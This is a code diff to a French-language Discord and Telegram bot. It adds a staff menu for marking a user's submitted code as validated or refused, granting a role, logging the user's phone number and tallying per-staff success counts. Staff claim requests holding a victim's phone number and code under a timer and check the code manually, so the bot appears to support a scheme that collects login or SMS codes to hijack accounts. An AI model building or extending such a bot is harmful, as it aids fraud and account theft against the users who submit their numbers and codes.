@@ -1263,9 +1263,15 @@ client.on("interactionCreate", async (i) => {
         )
       );
       const row3 = new ActionRowBuilder().addComponents(
+        new StringSelectMenuBuilder().setCustomId(`mod_code_${originGuildId}_${userId}`).setPlaceholder("📋 Résultat code...").addOptions(
+          { label: "Code validé", description: "Code correct — accès accordé", value: "code_validated", emoji: "✅" },
+          { label: "Code refusé", description: "Code incorrect — accès refusé", value: "code_refused", emoji: "❌" }
+        )
+      );
+      const row4 = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`close_${originGuildId}_${userId}`).setLabel("Supprimer le salon").setStyle(ButtonStyle.Danger).setEmoji("🗑️")
       );
-      const detailMsg = await newChannel.send({ content: `<@${claimerId}>`, embeds: [detailEmbed], components: [row1, row2, row3] });
+      const detailMsg = await newChannel.send({ content: `<@${claimerId}>`, embeds: [detailEmbed], components: [row1, row2, row3, row4] });
       data.threadId = newChannel.id;
       data.detailMessageId = detailMsg.id;
       data.claimTs = claimTs;
@@ -1288,7 +1294,7 @@ client.on("interactionCreate", async (i) => {
             const u = cur.isTg ? { username: cur.tgName || "Telegram", id: cur.userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(cur.userId).catch(() => targetUser);
             const og2 = cur.isTg ? { name: "Telegram", memberCount: 0 } : og || { name: "Serveur", memberCount: 0 };
             const newEmbed = await buildModEmbed(u, og2, cur.phone, cur.code, cur.dateStr, cur.claimTs, elapsedStr);
-            await msg.edit({ content: `<@${cur.claimedBy || claimerId}>`, embeds: [newEmbed], components: [row1, row2, row3] }).catch(() => {});
+            await msg.edit({ content: `<@${cur.claimedBy || claimerId}>`, embeds: [newEmbed], components: [row1, row2, row3, row4] }).catch(() => {});
           } catch {}
         }, 30000);
         data.timerInterval = iv;
@@ -1619,6 +1625,54 @@ client.on("interactionCreate", async (i) => {
     } catch {
       await i.reply({ content: "Erreur staff.", flags: MessageFlags.Ephemeral });
     }
+    return;
+  }
+  if (i.isStringSelectMenu() && i.customId.startsWith("mod_code_")) {
+    const sParts = i.customId.split("_");
+    const originGuildId = sParts[2];
+    const userId = sParts[3];
+    const key = `${originGuildId}:${userId}`;
+    const data = pending.get(key);
+    const value = i.values[0];
+    if (!data) { await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral }); return; }
+    if (data.timerInterval) { try { clearInterval(data.timerInterval); } catch {} }
+    const isValidated = value === "code_validated";
+    const claimerId = i.user.id;
+    let originGuild = null;
+    let claimedTag = "";
+    if (originGuildId === "tg") originGuild = { id: "tg", name: "Telegram" };
+    else { try { originGuild = await client.guilds.fetch(originGuildId); } catch { originGuild = { id: originGuildId, name: "Serveur" }; } try { const u = await client.users.fetch(userId); claimedTag = u.username; } catch {} }
+    // si validé : donne rôle
+    if (isValidated && originGuildId !== "tg") {
+      try { const og = await client.guilds.fetch(originGuildId); const member = await og.members.fetch(userId); await member.roles.add(process.env.ROLE_ID); } catch {}
+    }
+    try {
+      await sendFinalResultLog({ status: isValidated ? "validated" : "failed", claimerId, claimedUserId: userId, claimedUserTag: claimedTag, phone: data.phone || "Inconnu", originGuild: originGuild || { id: originGuildId, name: "Inconnu" }, tgName: data.tgName });
+    } catch {}
+    if (isValidated) stats.validated++; else stats.failed++;
+    stats.lastUpdate = new Date().toISOString();
+    stats.lastUpdateBy = claimerId;
+    stats.lastStatus = isValidated ? "validated" : "failed";
+    if (!stats.staff) stats.staff = {};
+    if (!stats.staff[claimerId]) stats.staff[claimerId] = { validated: 0, failed: 0, lastUpdate: null, lastStatus: null, tag: i.user.tag };
+    const s = stats.staff[claimerId];
+    if (isValidated) s.validated++; else s.failed++;
+    s.lastUpdate = stats.lastUpdate;
+    s.lastStatus = stats.lastStatus;
+    s.tag = i.user.tag;
+    saveDbStats().catch(() => saveStats());
+    pending.delete(key);
+    try { await i.update({ content: isValidated ? `✅ Code validé pour <@${userId}> — accès accordé.` : `❌ Code refusé pour <@${userId}>.`, components: [] }); } catch { await i.reply({ content: isValidated ? "✅ Code validé." : "❌ Code refusé.", flags: MessageFlags.Ephemeral }).catch(()=>{}); }
+    // notif user
+    try {
+      if (originGuildId === "tg") {
+        if (tgBot) await tgBot.telegram.sendMessage(userId, isValidated ? "✅ Ton code a été validé. Accès accordé !" : "❌ Ton code a été refusé. Réessaie.");
+      } else {
+        const u = await client.users.fetch(userId).catch(()=>null);
+        if (u) await u.send(isValidated ? "✅ Ton code a été validé. Accès accordé !" : "❌ Ton code a été refusé.").catch(()=>{});
+      }
+    } catch {}
+    setTimeout(() => i.channel.delete().catch(()=>{}), 2000);
     return;
   }
 });
